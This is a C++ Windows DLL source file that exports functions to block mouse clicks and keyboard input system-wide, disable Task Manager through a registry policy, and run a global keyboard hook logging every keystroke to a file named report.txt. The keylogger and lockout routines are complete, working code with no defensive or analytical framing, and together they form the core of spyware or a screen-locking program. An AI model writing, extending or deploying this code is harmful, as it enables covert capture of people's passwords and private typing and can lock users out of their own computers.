// dllmain.cpp : Defines the entry point for the DLL application.
#ifdef _MANAGED
#pragma managed(push, off)
#endif

#include "dllmain.h"
#include "stdafx.h"

HINSTANCE	 hInstDLL;

#pragma data_seg("SHARED")
HHOOK			hKeyboardHook;
HHOOK			hKeyLoggerHook;
HHOOK			hMouseHook;
#pragma data_seg()


BOOL APIENTRY DllMain( HMODULE hModule,
					  DWORD  ul_reason_for_call,
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	hInstDLL = (HINSTANCE) hModule;
	
	hMouseHook = NULL;
	return TRUE;
}

LRESULT CALLBACK MouseHookProc(int nCode, WORD wParam, DWORD lParam) 
{
	PMSLLHOOKSTRUCT p = (PMSLLHOOKSTRUCT)lParam;
	HWND hWnd = WindowFromPoint(p->pt);

	if(nCode >= 0)
	{
		if ((wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) /*&& hWnd == GetDesktopWindow()*/)
		{
			return 1;
		}
	}

	return CallNextHookEx(hMouseHook, nCode, wParam, lParam); 
} 
// Install hook
void doSetMouseGlobalHook(HWND hWnd)
{
	// Init value for MappedData	

	if (!hMouseHook)
		hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseHookProc, hInstDLL, 0);	

}
// Remove hook
void doRemoveMouseGlobalHook(HWND hWnd)
{
	if (hMouseHook)
		UnhookWindowsHookEx(hMouseHook);
}

void EXPORT LockMouse(HWND hWnd, BOOL bEnableDisable)
{
	if (!bEnableDisable)
	{
		doRemoveMouseGlobalHook(hWnd);
	}
	else
	{
		doSetMouseGlobalHook(hWnd);
	}
}
//TCHAR szEXEPath[MAX_PATH];
//
//GetModuleFileName ( NULL, szEXEPath, MAX_PATH );
LRESULT CALLBACK KeyLoggerHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
{
	FILE *f1;
	if (nCode < 0)  // do not process message 
		return CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );

	char ch;
	if (((DWORD)lParam & 0x40000000) &&(nCode==HC_ACTION))
	{		
		if ((wParam==VK_SPACE)||(wParam==VK_TAB)||(wParam==VK_RETURN)||((wParam>0x2f ) && (wParam<=0x100)))
		{
			f1=fopen("report.txt","a+");
			if ((wParam==VK_RETURN)||(wParam==VK_TAB))
			{	
				ch='\n';
				fwrite(&ch,1,1,f1);
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);
				WORD w;
				UINT scan;
				scan=0;
				ToAscii(wParam,scan,ks,&w,0);
				ch = char(w); 
				fwrite(&ch,1,1,f1);	
			}		
			fclose(f1);
		}
	}	
	LRESULT RetVal = CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );//Goi Hook procedure ke tiep trong Hook Chain	
	return  RetVal;
}

void EXPORT ActiveKeyLogger(HWND hWnd, BOOL bEnableDisable)
{
	if (!bEnableDisable)
	{
		if (hKeyLoggerHook)
		{
			UnhookWindowsHookEx(hKeyLoggerHook);
			hKeyLoggerHook = NULL;
		}
	}
	else
	{
		if (!hKeyLoggerHook)
			hKeyLoggerHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyLoggerHookProc, hInstDLL, 0);	
	}
}

LRESULT CALLBACK KeyboardHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)  // do not process message 
		return CallNextHookEx( hKeyboardHook, nCode, wParam, lParam );

	return 1;//CallNextHookEx( hHook, nCode, wParam, lParam );//Goi Hook procedure ke tiep trong Hook Chain	
}

void EXPORT LockKeyboard(HWND hWnd, BOOL bEnableDisable)
{
	if (!bEnableDisable)
	{
		if (hKeyboardHook)
		{
			UnhookWindowsHookEx(hKeyboardHook);
			hKeyboardHook = NULL;
		}
	}
	else
	{
		if (!hKeyboardHook)
			hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHookProc, hInstDLL, 0);	
	}
}


/****************************************
* Lock Task Manager (CTRL+ALT+DEL).    *
* TRUE=Lock, FALSE=UnLock              *
* (Win NT/2K/XP)                       *
****************************************/
int __declspec(dllexport) LockTaskManager(BOOL bEnableDisable)
{
#define KEY_DISABLETASKMGR  "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
#define VAL_DISABLETASKMGR  "DisableTaskMgr"

	HKEY    hKey;
	DWORD   val;
	LONG	r;

	if (RegOpenKey(HKEY_CURRENT_USER, KEY_DISABLETASKMGR, &hKey) != ERROR_SUCCESS)
		if (RegCreateKey(HKEY_CURRENT_USER, KEY_DISABLETASKMGR, &hKey) != ERROR_SUCCESS)
			return 0;

	if (!bEnableDisable) // Enable
	{
		r = RegDeleteValue(hKey, VAL_DISABLETASKMGR);
	}
	else                // Disable
	{
		val = 1;
		r = RegSetValueEx(hKey, VAL_DISABLETASKMGR, 0, REG_DWORD, (BYTE *)&val, sizeof(val));
	}

	RegCloseKey(hKey);

	return (r == ERROR_SUCCESS ? 1 : 0);
}
#ifdef _MANAGED
#pragma managed(pop)
#endif

